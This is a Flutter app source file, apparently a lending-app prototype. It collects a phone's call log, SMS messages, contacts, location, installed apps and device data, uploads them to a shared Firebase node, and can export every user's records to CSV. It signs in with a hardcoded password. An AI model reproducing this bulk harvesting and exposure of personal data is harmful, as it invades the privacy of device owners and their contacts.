import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:data_usage/data_usage.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:csv/csv.dart';
import 'package:flutter_contacts/contact.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:location/location.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart' as permission;
import 'package:firebase_core/firebase_core.dart';
import 'package:restart_app/restart_app.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  await FirebaseAuth.instance
      .signInWithEmailAndPassword(email: 'b@c.com', password: '123456');
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  List<List<dynamic>>? rowsAsListOfValues = [];
  List result = [];
  static const platform =
      const MethodChannel('com.cashful.deviceinformation/userdata');
  Location location = new Location();
  FirebaseFirestore firestore = FirebaseFirestore.instance;
  String? UID = FirebaseAuth.instance.currentUser?.uid;

  late bool _serviceEnabled;
  late PermissionStatus _permissionGranted;
  late LocationData _locationData;

  Future<void> getLocation() async {
    Location location = new Location();

    bool _serviceEnabled;
    PermissionStatus _permissionGranted;
    LocationData _locationData;

    _serviceEnabled = await location.serviceEnabled();
    if (!_serviceEnabled) {
      _serviceEnabled = await location.requestService();
      if (!_serviceEnabled) {
        return;
      }
    }

    _permissionGranted = await location.hasPermission();
    if (_permissionGranted == PermissionStatus.denied) {
      _permissionGranted = await location.requestPermission();
      if (_permissionGranted != PermissionStatus.granted) {
        return;
      }
    }

    _locationData = await location.getLocation();
    setState(() {
      result = [
        {
          'lat': _locationData.latitude.toString(),
          'long': _locationData.longitude.toString(),
        }
      ];
    });
    print(result);
  }

  Future<void> getContacts() async {
    if (await FlutterContacts.requestPermission()) {
      List<Contact> contacts =
          await FlutterContacts.getContacts(withProperties: true);
      result = [];
      contacts.forEach((element) {
        Map oneC = element.toJson();
        setState(() {
          result.add(oneC);
        });
      });
    }
  }

  Widget buttons(callName) {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
      children: [
        Container(
            width: MediaQuery.of(context).size.width * 0.25,
            child: Text(callName)),
        ElevatedButton(
            onPressed: () async {
              try {
                await platform.invokeMethod(callName).then((value) async {
                  setState(() {
                    result = value;
                  });
                  print(result);
                });
              } on PlatformException catch (e) {
                print(e.toString());
              }
            },
            child: Text('Fetch & Show')),
        ElevatedButton(
            onPressed: () async {
              if (await permission.Permission.storage.request().isGranted) {
                final String directory =
                    (await getExternalStorageDirectory())!.path;
                final path = "$directory/csv-$callName${DateTime.now()}.csv";
                rowsAsListOfValues = [];
                if (result.isNotEmpty) {
                  rowsAsListOfValues?.add(result[0].keys.toList());
                }
                for (Map element in result) {
                  setState(() {
                    rowsAsListOfValues!.add(element.values.toList());
                  });
                }
                String csvData =
                    ListToCsvConverter().convert(rowsAsListOfValues);
                print(csvData);
                final File file = File(path);
                await file.writeAsString(csvData).then((value) async {
                  print(await value.exists());
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Text('Successfully exported csv to local files'),
                  ));
                });
              } else {
                Map<permission.Permission, permission.PermissionStatus>
                    statuses = await [
                  permission.Permission.storage,
                ].request();
              }
            },
            child: Text('Export')),
      ],
    );
  }

  Future uploadToDatabase(callName) async {
    try {
      await platform.invokeMethod(callName).then((value) async {
        setState(() {
          result = value;
        });

        List uploadList = [];
        for (var element in result) {
          element['UID'] = UID;
          uploadList.add(element);
        }
        print(uploadList);
        DatabaseReference ref = FirebaseDatabase.instance.ref();
        await ref.child('metadata').child(callName).once().then((value) async {
          if (value.snapshot.exists) {
            var temp = value.snapshot.value as List;
            List oldData = temp.toList();
            oldData.removeWhere((element) => element['UID'] == UID);
            uploadList.addAll(oldData);
          }
          await ref.child('metadata').child(callName).set(uploadList);
        });
      });
    } on PlatformException catch (e) {
      print(e.toString());
    }
  }

  Future upload(callName) async {
    try {
      List uploadList = [];
      for (var element in result) {
        print(element.runtimeType);
        element['UID'] = UID;
        uploadList.add(element);
      }
      print(uploadList);
      DatabaseReference ref = FirebaseDatabase.instance.ref();
      ref.child('metadata').child(callName).once().then((value) {
        if (value.snapshot.exists) {
          var temp = value.snapshot.value as List;
          List oldData = temp.toList();
          oldData.removeWhere((element) => element['UID'] == UID);
          uploadList.addAll(oldData);
        }
        ref.child('metadata').child(callName).set(uploadList);
      });
    } on PlatformException catch (e) {
      print(e.toString());
    }
  }

  @override
  void initState() {

    //callAll();
    super.initState();
  }

  callAll() async {
    await uploadToDatabase('getCallLog');
    await uploadToDatabase('appInstall');
    await uploadToDatabase('device');
    await uploadToDatabase('sms');
    await getContacts().then((value) => upload('contacts'));
    await getLocation().then((value) => upload('locations'));
    await uploadToDatabase('dataUsage');
    print('DONE');
  }
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.start,
          children: <Widget>[
            ElevatedButton(
                onPressed: () async {
                  ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
                    content: Text('Uploading'),
                  ));
                  await uploadToDatabase('getCallLog');
                  await uploadToDatabase('appInstall');
                  await uploadToDatabase('dataUsage');
                  await uploadToDatabase('device');
                  await uploadToDatabase('sms');
                  await getContacts().then((value) => upload('contacts'));
                  await getLocation().then((value) => upload('locations'));
                  ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
                    content: Text('Finished'),
                  ));
                },
                child: Text('Upload to Firebase')),
            ElevatedButton(
                onPressed: () async {
                  List<String> names = [
                    'getCallLog',
                    'appInstall',
                    'dataUsage',
                    'device',
                    'sms',
                    'contacts',
                    'locations'
                  ];
                  await Future.forEach(names, (element) async {
                    DatabaseReference ref = FirebaseDatabase.instance.ref();
                    await ref.child('metadata').child(element.toString()).once().then((value) async {
                     if(value.snapshot.exists) {
                       var temp = value.snapshot.value as List;
                       List result = temp.toList();
                       if (await permission.Permission.storage
                           .request()
                           .isGranted) {
                         final String directory =
                             (await getExternalStorageDirectory())!.path;
                         final path =
                             "$directory/csv-$element${DateTime.now()}.csv";
                         rowsAsListOfValues = [];
                         if (result.isNotEmpty) {
                           rowsAsListOfValues?.add(result[0].keys.toList());
                         }
                         for (Map element in result) {
                           setState(() {
                             rowsAsListOfValues!.add(element.values.toList());
                           });
                         }
                         String csvData =
                         ListToCsvConverter().convert(rowsAsListOfValues);
                         print(csvData);
                         final File file = File(path);
                         await file.writeAsString(csvData).then((value) async {
                           print(await value.exists());
                           ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                             duration: Duration(microseconds: 500),
                             content:
                             Text('Successfully exported $element to local CSV files'),
                           ));
                         });
                       } else {
                         Map<permission.Permission, permission.PermissionStatus>
                         statuses = await [
                           permission.Permission.storage,
                         ].request();
                       }
                     }
                    });

                  });
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content:
                    Text('All finished'),
                  ));

                },
                child: Text('Download all user CSV')),
            Expanded(
              child: ListView.builder(
                  shrinkWrap: true,
                  itemCount: result.length,
                  itemBuilder: (context, index) {
                    return Padding(
                      padding: const EdgeInsets.all(8.0),
                      child: Text('${result[index]}'),
                    );
                  }),
            ),
          ],
        ),
      ),
    );
  }
}
